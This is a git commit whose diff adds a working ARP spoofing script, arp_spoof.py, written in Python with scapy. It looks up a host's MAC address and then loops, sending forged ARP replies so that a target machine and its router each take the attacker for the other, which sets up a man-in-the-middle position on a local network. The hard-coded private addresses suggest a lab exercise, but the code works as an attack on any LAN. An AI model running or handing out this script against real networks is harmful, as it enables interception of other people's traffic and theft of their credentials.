b572fdf156fb8b135d521438ff0bbe83b1ae806a
unRony <ruwith0011@gmail.com>
2025-12-06 10:11:08 -0600

    added a function that gets a mac address of a specific ip and then added a spoofer function to trick the router that im the target and also trick the target that im the router , also added a quitter

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,4 +1,30 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import time
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2 , pdst=target_ip , hwdst=target_mac , psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+packets_count = 0
+try:
+    while True:
+        spoof("192.168.111.129","192.168.111.2")
+        spoof("192.168.111.2","192.168.111.129")
+        packets_count = packets_count + 2
+        print(f"Sent {packets_count} packets.")
+        time.sleep(2)
+except KeyboardInterrupt:
+        print("   Quitting...")
 
